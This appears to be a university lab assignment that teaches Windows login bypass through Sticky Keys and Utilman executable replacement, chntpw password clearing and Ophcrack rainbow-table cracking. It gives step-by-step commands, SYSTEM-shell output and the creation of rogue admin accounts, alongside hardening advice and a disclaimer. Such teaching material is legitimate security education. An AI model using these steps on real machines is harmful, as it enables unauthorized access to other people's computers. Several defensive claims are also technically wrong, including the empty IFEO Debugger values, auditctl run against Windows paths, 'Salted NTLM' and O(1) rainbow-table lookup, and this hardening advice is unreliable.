# ASSIGNMENT 3: WINDOWS LOGIN BYPASS TECHNIQUES

**Duration:** 3-4 hours  
**Learning Outcomes:** Desktop security, authentication bypass, password recovery

---

## 📋 Table of Contents

1. [Sticky Keys Bypass Method](#1-sticky-keys-bypass-method)
2. [Password Reset Using chntpw](#2-password-reset-using-chntpw)
3. [Utilman.exe Accessibility Bypass](#3-utilmanexe-accessibility-bypass)
4. [Ophcrack Password Recovery](#4-ophcrack-password-recovery)
5. [VM Snapshot Management](#5-create-snapshot-and-restore)
6. [Security Recommendations](#-security-recommendations)
7. [Lab Setup Requirements](#-lab-setup-requirements)

---

## 1. STICKY KEYS BYPASS METHOD

### Overview
The Sticky Keys bypass exploits the accessibility feature by replacing the system executable responsible for Sticky Keys with Command Prompt, allowing unauthenticated access to system commands.

### Prerequisites
- Windows 10 VM (target system)
- Linux live USB (Kali Linux or Ubuntu)
- Physical or virtualized access to boot device

### Step-by-Step Instructions

#### Step 1a: Boot Windows VM with Linux Live USB
```bash
# 1. Insert Linux live USB into VM or configure boot order
# 2. Restart the Windows VM
# 3. Access boot menu (usually F12, ESC, or DEL depending on system)
# 4. Select USB boot device
# 5. Wait for Linux to fully load
```

#### Step 1b: Navigate to C:\Windows\System32
```bash
# After Linux boots, open terminal/file manager
# Mount Windows partition (usually /dev/sda1 or /dev/sda2)

sudo mount /dev/sda1 /mnt
cd /mnt/Windows/System32

# Verify sethc.exe exists
ls -la sethc.exe
```

#### Step 1c: Backup sethc.exe
```bash
# Always backup before modifying critical system files
sudo cp sethc.exe sethc.exe.bak

# Verify backup was created
ls -la sethc.exe*
```

#### Step 1d: Replace sethc.exe with cmd.exe
```bash
# sethc.exe is the Sticky Keys executable
# Replace it with cmd.exe to gain command prompt access

sudo cp cmd.exe sethc.exe

# Verify replacement
ls -la sethc.exe
file sethc.exe
```

#### Step 1e: Reboot and Press SHIFT 5 Times
```bash
# 1. Reboot the VM
sudo reboot

# 2. Boot into Windows (remove USB if needed)
# 3. At Windows login screen, press SHIFT key 5 times rapidly
# 4. Instead of Sticky Keys dialog, Command Prompt opens with SYSTEM privileges
```

#### Step 1f: Open Command Prompt with System Privileges
```cmd
# Command Prompt now runs as SYSTEM (highest privilege level)
# Verify privilege level:
whoami
# Output: NT AUTHORITY\SYSTEM

# List users
net user

# Create new admin account (if needed)
net user newadmin password123 /add
net localgroup administrators newadmin /add
```

### Expected Output
```
C:\Windows\System32>whoami
nt authority\system

C:\Windows\System32>net user
User accounts for \\COMPUTERNAME

Administrator          Guest                  User
The command completed successfully.
```

### Remediation & Screenshots
- Document the process with screenshots at each step
- Note the timestamp and actions performed
- Show the command prompt running as SYSTEM user

---

## 2. PASSWORD RESET USING chntpw

### Overview
chntpw is a Linux-based utility that reads and modifies Windows user account passwords directly from the SAM (Security Accounts Manager) file.

### Prerequisites
- Linux live USB (preferably Kali - chntpw pre-installed)
- Access to Windows partition
- Understanding of Windows user accounts

### Step-by-Step Instructions

#### Step 2a: Boot with Linux Live USB
```bash
# Same process as Step 1a
# Boot Linux and load into terminal environment
```

#### Step 2b: Mount Windows Partition
```bash
# List available partitions
sudo fdisk -l

# Mount Windows partition (usually NTFS)
sudo mount -t ntfs /dev/sda1 /mnt

# Or with ntfs-3g driver for better compatibility
sudo mount -t ntfs-3g /dev/sda1 /mnt

# Verify mount
mount | grep /mnt
```

#### Step 2c: Use chntpw Tool to View User Accounts
```bash
# Navigate to Windows Registry location
cd /mnt/Windows/System32/config

# List available user accounts
sudo chntpw -l SAM

# Sample output:
# Hives that have changed:
# C_000...
# Administrator (RID: 500)
# Guest (RID: 501)
# User1 (RID: 1001)
# User2 (RID: 1002)
```

#### Step 2d: Clear or Reset User Password
```bash
# Method 1: Clear password (set to blank)
sudo chntpw -u Administrator SAM

# Interactive menu appears:
# Select option to clear password (usually option 1)
# Type: 1 (to clear password)
# Type: y (to confirm)

# Method 2: Reset specific user password
sudo chntpw -u User1 SAM
# Follow interactive prompts

# Method 3: Batch processing
sudo chntpw -e SAM
# Edit mode allows multiple modifications
```

#### Step 2e: Reboot and Login
```bash
# 1. Type 'q' to quit chntpw
# 2. Unmount Windows partition
sudo umount /mnt

# 3. Reboot system
sudo reboot

# 4. Boot into Windows
# 5. Login with cleared/reset password (usually blank for cleared passwords)
```

### Expected Output
```
$ sudo chntpw -l SAM
chntpw version 1.00 + marvonlinux realm mod 0.0.1
Hives that have changed:
 #  Name
 0  </mnt/Windows/System32/config/SAM>

Administrator (RID: 500) has password: YES (encrypted)
Guest (RID: 501) has password: NO
User1 (RID: 1001) has password: YES (encrypted)

$ sudo chntpw -u Administrator SAM
Administrator selected
```

### Important Notes
- **Password Protection Disabled:** After clearing password, user can login without authentication
- **Backup First:** Always backup SAM file before modifications
- **Log Actions:** Document all modifications for lab purposes

---

## 3. UTILMAN.exe ACCESSIBILITY BYPASS

### Overview
Utilman.exe is the Windows Utility Manager accessible from the login screen. Replacing it with cmd.exe provides system command access via the Ease of Access button.

### Prerequisites
- Same as Sticky Keys bypass
- Linux live USB boot capability

### Step-by-Step Instructions

#### Step 3a: Boot with Linux Live USB
```bash
# Same boot procedure as previous methods
sudo mount /dev/sda1 /mnt
cd /mnt/Windows/System32
```

#### Step 3b: Backup and Replace utilman.exe
```bash
# Backup original utility manager
sudo cp utilman.exe utilman.exe.bak

# Replace with command prompt
sudo cp cmd.exe utilman.exe

# Verify replacement
ls -la utilman.exe
```

#### Step 3c: Trigger at Login Screen
```bash
# 1. Reboot VM
sudo reboot

# 2. Boot into Windows
# 3. At login screen, look for "Ease of Access" button (usually bottom-left)
# 4. Click the accessibility icon
# 5. Command Prompt opens with SYSTEM privileges
```

#### Step 3d: System-Level Command Prompt Access
```cmd
# Gained prompt runs as SYSTEM
whoami
# Output: nt authority\system

# Now you have full system access
# Can create admin users, disable UAC, modify registry, etc.

# Example: Create privileged user
net user backdoor password123 /add
net localgroup administrators backdoor /add
```

### Comparison with Sticky Keys

| Method | Trigger | Access Point | Difficulty |
|--------|---------|--------------|-----------|
| Sticky Keys | SHIFT x5 | Login Screen | Easy |
| Utilman.exe | Accessibility Button | Login Screen | Easy |
| Both | Different icons | Same privilege level | Equivalent |

### Key Differences
- **Trigger Point:** Utilman uses visual button instead of key combo
- **Discoverability:** Less obvious than repeated key press
- **Persistence:** Same SYSTEM-level access as Sticky Keys

---

## 4. OPHCRACK PASSWORD RECOVERY

### Overview
Ophcrack is a Windows password cracker that uses rainbow tables to recover plaintext passwords. It cracks LM and NTLM hashes without requiring SAM modification.

### Prerequisites
- Ophcrack Live CD ISO file
- Windows 10 VM
- Adequate storage for rainbow tables (if needed)
- Internet connectivity (optional, for downloads)

### Step-by-Step Instructions

#### Step 4a: Download Ophcrack Live CD
```bash
# Download from official source
# URL: https://ophcrack.sourceforge.io/

# Verify downloaded ISO
sha256sum ophcrack-3.8.0.iso
# Compare with official checksum

# File details:
# Ophcrack version: 3.8.0+
# Includes: Live Linux + Rainbow tables
# Size: ~700MB (CD) or ~4GB (DVD)
```

#### Step 4b: Boot Windows VM with Ophcrack
```bash
# 1. Configure VM to boot from ISO
#    - Virtual Machine Settings > Boot Options > Select ISO
# 2. Start VM
# 3. Wait for Ophcrack to load
# 4. Graphical interface appears automatically
```

#### Step 4c: Let Ophcrack Automatically Extract and Crack Passwords
```
Ophcrack Interface Steps:
├── 1. Click "Load" button
├── 2. Select target Windows partition
├── 3. Tool automatically:
│   ├── Mounts Windows filesystem
│   ├── Locates SAM file
│   ├── Extracts password hashes (LM/NTLM)
│   ├── Loads default rainbow tables
│   └── Begins cracking process
├── 4. Progress bar shows:
│   ├── Hashes found
│   ├── Hashes cracked
│   ├── Cracking time elapsed
│   └── Current hash being processed
└── 5. Results display in GUI
```

#### Step 4d: Observe Rainbow Table Attack in Action
```
Rainbow Table Attack Process:
─────────────────────────────────────

Phase 1: Hash Extraction
  • Read SAM file: ✓
  • Extract LM hashes: ✓
  • Extract NTLM hashes: ✓
  
Phase 2: Rainbow Table Matching
  • Load rainbow tables into memory
  • For each hash:
    - Look up in table 1 (Fast)
    - Look up in table 2 (Medium)
    - Look up in table 3 (Slower)
    
Phase 3: Hash Verification
  • Found: Hash → Plaintext
  • Not found: Continue with next method
  
Phase 4: Results Display
  Username    | Password     | Status
  ───────────────────────────────────
  Administrator | password123 | Cracked
  Guest         | [Empty]     | Cracked
  User1         | P@ssw0rd!   | Cracked
  User2         | [Not found] | Failed
```

### Sample Ophcrack Output
```
Ophcrack 3.8.0
File: /var/samba/sam
Hashes loaded: 4

Hash: E52CAC67419A6A7A65E7E014DEF81B57
User: Administrator
Password: password123
Time: 0.234 seconds

Hash: AAD3B435B51404EEAAD3B435B51404EE
User: Guest  
Password: [empty]
Time: 0.001 seconds (empty hash)

Hash: 8846F7EAEE8FB117AD06BDD830B7586C
User: User1
Password: P@ssw0rd!
Time: 1.423 seconds

Hash: 7C6A180B36896A0A8C02787EEAFB0E4C
User: User2
Password: [Not cracked]
Time: Timeout
```

### Performance Notes
| Hash Type | Rainbow Table Size | Average Time |
|-----------|------------------|--------------|
| LM (old) | 10GB | < 1 second |
| NTLM (weak) | 50GB | 1-10 seconds |
| NTLM (strong) | 500GB | 10 seconds - 1 hour |
| Salted NTLM | N/A | Not vulnerable to RB |

### Why Rainbow Tables Work
```
Traditional Brute Force:
  Input: Try all possible passwords → Hash → Compare
  Time: Hours to days
  
Rainbow Table Lookup:
  Input: Hash from SAM file
  Lookup: O(1) hash table operation
  Time: Milliseconds to seconds
  
Trade-off:
  Storage: Pre-compute and store millions of hashes
  Speed: Instant lookup at cost of disk space
```

---

## 5. CREATE SNAPSHOT AND RESTORE

### Overview
Virtual Machine snapshots allow you to capture a clean state before testing, enabling safe restoration after each exploit test.

### Prerequisites
- Hypervisor: VMware, VirtualBox, Hyper-V
- Windows 10 VM with adequate storage
- Each snapshot requires 5-50GB storage space

### Step-by-Step Instructions

#### Step 5a: Practice on Windows 10 VM Only
```
IMPORTANT RESTRICTIONS:
✓ Use ONLY lab/isolated VMs
✓ Do NOT perform on production systems
✓ Do NOT practice on network-connected systems
✓ Keep isolated lab environment

Lab Network Setup:
┌─────────────────────────────────┐
│    Isolated Lab Network         │
├─────────────────────────────────┤
│ ┌─────────────┐   ┌──────────┐ │
│ │  Windows 10 │←→ │  Linux   │ │
│ │     VM      │   │  Live USB│ │
│ └─────────────┘   └──────────┘ │
│                                 │
│ (NO external network access)    │
└─────────────────────────────────┘
```

#### Step 5b: Taking Snapshots

**VMware vSphere/Workstation:**
```
1. Right-click VM → Snapshots → Take Snapshot
2. Enter details:
   - Name: "Windows10_Clean_State_20250615"
   - Description: "Before bypass testing"
3. Click OK
4. Wait for snapshot completion
5. Verify in Snapshots pane
```

**VirtualBox:**
```bash
# Command line method
VBoxManage snapshot "Windows10VM" take "Clean_State_20250615" \
  --description "Before bypass testing"

# GUI method
1. VM Menu → Snapshots (or Ctrl+Shift+T)
2. Click camera icon → Take Snapshot
3. Enter name and description
4. Click OK
```

**Hyper-V:**
```powershell
# PowerShell method
Checkpoint-VM -Name "Windows10VM" `
  -SnapshotName "Clean_State_20250615" `
  -Description "Before bypass testing"

# GUI method
1. Hyper-V Manager → Select VM
2. Right-click → Checkpoint
3. Name: "Clean_State_20250615"
4. Click OK
```

#### Step 5c: Always Restore VM to Clean State

**After each test, restore snapshot:**

**VMware:**
```
1. Right-click VM → Snapshots → Restore to Snapshot
2. Select "Windows10_Clean_State_20250615"
3. Confirm action
4. Wait for restoration
5. VM reverts to snapshot state
```

**VirtualBox:**
```bash
# Command line
VBoxManage snapshot "Windows10VM" restore "Clean_State_20250615"

# GUI
1. Snapshots panel → Select snapshot
2. Click restore button (green arrow)
3. Confirm
```

**Hyper-V:**
```powershell
Restore-VMCheckpoint -VMName "Windows10VM" `
  -Name "Clean_State_20250615" -Confirm
```

#### Step 5d: Document Each Bypass Method

**Documentation Template:**

```markdown
## Test Log: Sticky Keys Bypass

**Date:** June 15, 2025
**VM Name:** Windows10_Lab
**Tester:** sarfarajansari2299

### Preparation
- [x] Snapshot taken before test
- [x] VM isolated from network
- [x] Linux live USB prepared
- [ ] Secondary backups created

### Test Execution

#### Phase 1: Boot Sequence
**Time:** 14:30 UTC
- Linux USB inserted
- VM boot order configured
- System boots to Linux live environment
- Duration: 3 minutes 42 seconds
- **Screenshot:** boot_sequence_001.png

#### Phase 2: File System Access
**Time:** 14:35 UTC
- Windows NTFS partition mounted
- C:\Windows\System32 located
- sethc.exe identified
- **Screenshot:** file_location_001.png
- **Hash:** SHA256 (sethc.exe) = abc123def456...

#### Phase 3: Exploitation
**Time:** 14:38 UTC
- sethc.exe backed up → sethc.exe.bak
- cmd.exe copied → sethc.exe
- Changes verified
- **Screenshot:** replacement_verification_001.png

#### Phase 4: Payload Delivery
**Time:** 14:42 UTC
- VM rebooted
- Windows login screen appeared
- SHIFT key pressed 5 times
- Command prompt opened
- **Screenshot:** command_prompt_execution_001.png

#### Phase 5: Privilege Verification
**Time:** 14:44 UTC
- Command: `whoami`
- Result: `nt authority\system`
- **Screenshot:** system_privileges_001.png

### Results Summary
| Metric | Value |
|--------|-------|
| Exploitation Success | ✓ Yes |
| Privilege Level | SYSTEM |
| Time to Compromise | 14 minutes |
| Detection Method | Visual inspection |
| Difficulty Level | Low |

### Remediation Applied
- File permissions hardened
- Windows Defender enabled
- UAC settings strengthened
- Accessibility features restricted

### Post-Test Actions
- [x] Snapshot restored
- [x] VM returned to clean state
- [x] Documentation complete
- [x] Evidence archived
```

### Snapshot Management Script
```bash
#!/bin/bash
# Automated snapshot and test cycle

VM_NAME="Windows10_Lab"
SNAPSHOT_NAME="Clean_State_$(date +%Y%m%d)"

# Create snapshot
echo "[*] Creating snapshot: $SNAPSHOT_NAME"
VBoxManage snapshot "$VM_NAME" take "$SNAPSHOT_NAME" \
  --description "Pre-test clean state"

# Run test (user interaction required)
echo "[*] Ready for testing. Press ENTER to continue..."
read

# Restore snapshot
echo "[*] Restoring snapshot..."
VBoxManage snapshot "$VM_NAME" restore "$SNAPSHOT_NAME"

echo "[✓] Snapshot restored. VM is clean."
```

---

## 🔒 SECURITY RECOMMENDATIONS

### Preventive Measures

#### 1. Disable Accessibility Shortcuts
```powershell
# PowerShell (Administrator)
# Disable Sticky Keys at logon screen
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" `
  -Name "Debugger" -Value ""

# Disable Utilman accessibility
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" `
  -Name "Debugger" -Value ""
```

#### 2. Protect SAM File
```powershell
# Set strict file permissions
# SAM file should only be readable by SYSTEM

icacls "C:\Windows\System32\config\SAM" /grant:r "SYSTEM:(F)" `
  /inheritance:r

# Verify permissions
icacls "C:\Windows\System32\config\SAM"
```

#### 3. Enable Windows Defender
```powershell
# Enable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $false

# Run quick scan
Start-MpScan -ScanType QuickScan

# Check threat history
Get-MpComputerStatus | Select AntivirusEnabled
```

#### 4. Enforce Strong Passwords
```powershell
# Group Policy: Enforce complex passwords
# Path: Computer Configuration > Windows Settings > 
#       Security Settings > Account Policies > Password Policy

# Minimum password length: 12 characters
# Password complexity: Required
# Password history: 24 previous passwords
```

#### 5. Enable UEFI Secure Boot
```
BIOS/UEFI Settings:
├── Security
│   ├── Secure Boot: Enabled
│   ├── TPM: Enabled
│   ├── Virtualization: Enabled (for VM hosts)
│   └── USB Boot: Disabled (or restricted)
├── Boot
│   ├── Boot order: Hard Drive first
│   ├── Removable Media: Disabled
│   └── Network Boot: Disabled
└── Authentication
    └── Password: Set strong BIOS password
```

#### 6. Monitor File Integrity
```powershell
# Use File Integrity Monitoring
# Monitor System32 executable files

# Example: Windows Subsystem for Linux audit
auditctl -w C:\Windows\System32\sethc.exe -p wa -k sethc_changes
auditctl -w C:\Windows\System32\utilman.exe -p wa -k utilman_changes
```

### Detection Techniques

#### Forensic Analysis After Attack
```bash
# Linux forensics tools
sudo apt-get install chkrtools sleuthkit

# List recently modified files
find /mnt/Windows/System32 -type f -mtime -1 -ls

# Check file hashes
md5sum /mnt/Windows/System32/sethc.exe

# Compare with known good hash
# Reference: https://www.virustotal.com/
```

#### Log Analysis
```powershell
# Check Windows Event Viewer
# Security → Audit Logs → Account Logon Events

# PowerShell: Export security logs
Get-EventLog -LogName Security -InstanceId 4624 |
  Export-Csv "SecurityLogins.csv"

# Look for suspicious SYSTEM account logins
Get-EventLog -LogName Security |
  Where-Object {$_.Message -like "*SYSTEM*"} |
  Format-Table TimeGenerated, Message
```

### Defense in Depth Checklist

- [ ] UEFI Secure Boot enabled
- [ ] TPM 2.0 enabled and locked
- [ ] BIOS password protected
- [ ] BitLocker full disk encryption
- [ ] Windows Defender active
- [ ] Windows Update current
- [ ] User Account Control (UAC) enabled
- [ ] Account lockout policy enabled
- [ ] File permission auditing enabled
- [ ] Login attempt logging enabled
- [ ] USB ports disabled on critical systems
- [ ] Boot device restrictions set

---

## 🛠️ LAB SETUP REQUIREMENTS

### Hardware Requirements
```
Minimum:
├── CPU: Intel i5/AMD Ryzen 5 (4 cores)
├── RAM: 16 GB minimum
│   ├── Host OS: 4 GB
│   ├── Windows 10 VM: 8 GB
│   └── Linux Live: 4 GB
├── Storage: 100 GB minimum
│   ├── Host OS: 20 GB
│   ├── Windows 10 VM: 40 GB
│   ├── Linux VM: 20 GB
│   └── Snapshots: 40 GB
└── Network: Isolated lab network

Recommended:
├── CPU: Intel i7/AMD Ryzen 7 (8 cores)
├── RAM: 32 GB
├── Storage: 500 GB SSD
└── Network: Dedicated lab VLAN
```

### Software Requirements
```
Host OS:
├── Windows 10/11 Pro or Enterprise
├── Hypervisor (choose one):
│   ├── VMware Workstation Pro
│   ├── Hyper-V (Windows Pro/Enterprise)
│   └── VirtualBox (free)
└── Backup tools:
    ├── 7-Zip
    └── Backup & Restore utility

Guest VMs:
├── Windows 10 21H2 or later
│   ├── ISO: Windows 10 Media Creation Tool
│   └── Updates: Latest cumulative update
├── Linux Live (choose one):
│   ├── Kali Linux 2025.x
│   ├── Ubuntu 24.04 LTS
│   └── Parrot Security OS
└── Tools:
    ├── Ophcrack Live CD
    ├── chntpw (pre-installed in Kali)
    └── Volatility (optional)
```

### Network Configuration
```
Isolated Lab Network Architecture:

┌─────────────────────────────────────────┐
│          Host Computer                   │
│  ┌───────────────────────────────────┐  │
│  │      VMware/VirtualBox/Hyper-V    │  │
│  │                                   │  │
│  │  ┌─────────────────────────────┐  │  │
│  │  │  Virtual Switch (Isolated)  │  │  │
│  │  │  10.0.0.0/24 (Example)      │  │  │
│  │  │                             │  │  │
│  │  │  ┌──────────┐  ┌──────────┐ │  │  │
│  │  │  │Windows 10│  │Linux Live│ │  │  │
│  │  │  │10.0.0.10 │  │10.0.0.20 │ │  │  │
│  │  │  └──────────┘  └──────────┘ │  │  │
│  │  │     (NAT Disabled)           │  │  │
│  │  └─────────────────────────────┘  │  │
│  │                                   │  │
│  └───────────────────────────────────┘  │
│                                         │
│  ✓ Isolated from internet              │
│  ✓ No external connectivity            │
│  ✓ No access to production systems     │
└─────────────────────────────────────────┘
```

### Configuration Steps

#### 1. Create Virtual Switch (VMware Example)
```
VMware → Edit → Virtual Network Editor
├── Virtual Networks
│   └── Create new (Host-only or Internal)
│       ├── Name: "Lab-Isolated"
│       ├── Type: Host-Only or Internal
│       ├── Network: 10.0.0.0
│       ├── Netmask: 255.255.255.0
│       └── DHCP: Disable
└── Apply
```

#### 2. Configure Windows 10 VM
```
VM Settings:
├── Hardware
│   ├── RAM: 8 GB
│   ├── CPU: 4 cores
│   ├── Storage: 40 GB SSD
│   └── Network: Lab-Isolated (no NAT)
├── Security
│   ├── Secure Boot: Enabled
│   ├── Firmware: UEFI
│   └── TPM: Enabled
└── Display
    ├── Video Memory: 2 GB
    └── 3D Acceleration: Enabled
```

#### 3. Configure Linux VM
```
VM Settings:
├── Hardware
│   ├── RAM: 4 GB
│   ├── CPU: 2 cores
│   ├── Storage: 20 GB
│   └── Network: Lab-Isolated
├── Devices
│   ├── USB Controller: Enabled
│   ├── CD/DVD: Set to ISO
│   └── Floppy: Disabled
└── Boot
    ├── Boot Order: CD-ROM first
    ├── USB: Enabled
    └── Network: Disabled
```

#### 4. Create Linux Live USB
```bash
# Linux method
sudo dd if=kali-linux-2025.1-live-amd64.iso \
  of=/dev/sdX bs=4M status=progress

sync

# Verify
sudo fdisk -l /dev/sdX

# Windows method (using balena Etcher)
# 1. Download balena Etcher
# 2. Select ISO file
# 3. Select USB device
# 4. Click Flash
# 5. Wait for completion
```

---

## 📸 EVIDENCE COLLECTION GUIDELINES

### Screenshot Naming Convention
```
Format: [Method]_[Phase]_[Sequence]_[Date].png

Examples:
├── Sticky_Keys_Phase1_Boot_20250615.png
├── Sticky_Keys_Phase2_FileLocation_20250615.png
├── Sticky_Keys_Phase3_Exploitation_20250615.png
├── Sticky_Keys_Phase4_Payload_20250615.png
├── Sticky_Keys_Phase5_Verification_20250615.png
├── chntpw_Phase1_HashExtraction_20250615.png
├── chntpw_Phase2_PasswordReset_20250615.png
├── Utilman_Phase1_Boot_20250615.png
├── Utilman_Phase2_Exploitation_20250615.png
├── Ophcrack_Phase1_LoadingSAM_20250615.png
├── Ophcrack_Phase2_CrackingProgress_20250615.png
└── Ophcrack_Phase3_Results_20250615.png
```

### Evidence Documentation
```markdown
### Screenshot: Sticky_Keys_Phase5_Verification_20250615.png

**Content:** Command prompt showing `whoami` output as SYSTEM
**Context:** After triggering Sticky Keys bypass at login screen
**Significance:** Proves system-level command execution
**Hash (SHA256):** abc123def456789...
**Captured:** 2025-06-15 14:44:32 UTC
**Relevance:** Demonstrates exploitation success

**Observations:**
- Command prompt window title: "C:\Windows\System32\cmd.exe"
- User context: "NT AUTHORITY\SYSTEM"
- Working directory: "C:\Windows\System32"
- Command executed: whoami
- Output: "nt authority\system"

**Security Implications:**
- System-level access achieved
- User authentication bypassed
- All file system operations now possible
- Registry modifications now possible
- Can create privileged accounts
```

### Log Files to Preserve
```
logs/
├── Windows_Event_Logs/
│   ├── Security_20250615.evtx
│   ├── System_20250615.evtx
│   └── Application_20250615.evtx
├── Exploitation_Logs/
│   ├── chntpw_output_20250615.txt
│   ├── ophcrack_results_20250615.txt
│   └── command_history_20250615.txt
├── Forensics/
│   ├── file_hashes_20250615.txt
│   ├── registry_exports_20250615.txt
│   └── user_accounts_20250615.txt
└── Timeline/
    └── exploitation_timeline_20250615.md
```

---

## 📝 DELIVERABLES CHECKLIST

- [ ] README.md (this document) completed
- [ ] All 4 bypass methods documented
- [ ] Step-by-step instructions for each method
- [ ] Screenshots for each phase
- [ ] Test logs for each exploitation
- [ ] Evidence preserved with hashes
- [ ] Security recommendations documented
- [ ] Lab setup verified and tested
- [ ] VM snapshots created and restored successfully
- [ ] All systems returned to clean state
- [ ] Final report compiled

---

## ⚠️ LEGAL AND ETHICAL DISCLAIMER

### Authorized Use Only
```
This assignment is for EDUCATIONAL PURPOSES ONLY.

Restrictions:
❌ Do NOT perform these techniques on systems you don't own
❌ Do NOT use these methods for unauthorized access
❌ Do NOT practice on production systems or networks
❌ Do NOT penetrate systems without written permission
❌ Do NOT disclose vulnerabilities publicly

Authorized Use:
✅ Only on isolated lab virtual machines
✅ Only for educational security training
✅ Only within academic or authorized environments
✅ Only with explicit permission from system owners
✅ Only for defensive/protective purposes

Legal Consequences:
• Unauthorized system access is a federal crime (18 U.S.C. § 1030)
• Penalties: Up to 10 years imprisonment and $250,000 fines
• Civil liability for damages
• Loss of employment and professional licenses
• Criminal record affecting future opportunities
```

---

## 📚 REFERENCES AND FURTHER READING

### Official Documentation
- [Microsoft Security Documentation](https://docs.microsoft.com/en-us/security/)
- [Windows 10 Security Guide](https://docs.microsoft.com/en-us/windows/security/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

### Tools Documentation
- [Ophcrack Official Site](https://ophcrack.sourceforge.io/)
- [chntpw Documentation](http://pogostick.net/~pnh/ntpasswd/)
- [Kali Linux Tools](https://www.kali.org/tools/)

### Security Resources
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [SANS Security Resources](https://www.sans.org/security-resources/)

### Related Topics
- Windows Security Architecture
- Digital Forensics and Incident Response
- Penetration Testing Methodologies
- Defensive Security Measures

---

## 🎓 LEARNING OUTCOMES SUMMARY

Upon completion of this assignment, you will have:

1. **Desktop Security Understanding**
   - Learned how Windows authentication works
   - Understood the role of system executables in security
   - Recognized vulnerabilities in accessibility features

2. **Authentication Bypass Techniques**
   - Mastered Sticky Keys replacement technique
   - Mastered Utilman.exe accessibility bypass
   - Understood physical access implications
   - Recognized need for UEFI/TPM protection

3. **Password Recovery Methods**
   - Learned SAM file structure and location
   - Mastered chntpw tool for password manipulation
   - Understood password hashing and recovery

4. **Advanced Attack Tools**
   - Used rainbow tables for password cracking
   - Understood Ophcrack's attack methodology
   - Learned hash extraction and analysis

5. **Secure Lab Practices**
   - Created and managed VM snapshots
   - Isolated lab networks properly
   - Documented security testing procedures
   - Preserved forensic evidence

---

## 📧 CONTACT AND SUPPORT

**Assignment Author:** sarfarajansari2299  
**Lab Environment:** Windows 10 Isolated Network  
**Last Updated:** June 15, 2025  

For questions or clarifications, refer to course materials or contact your instructor.

---

**⚖️ Remember:** With great power comes great responsibility. Use this knowledge ethically and legally. 🔐
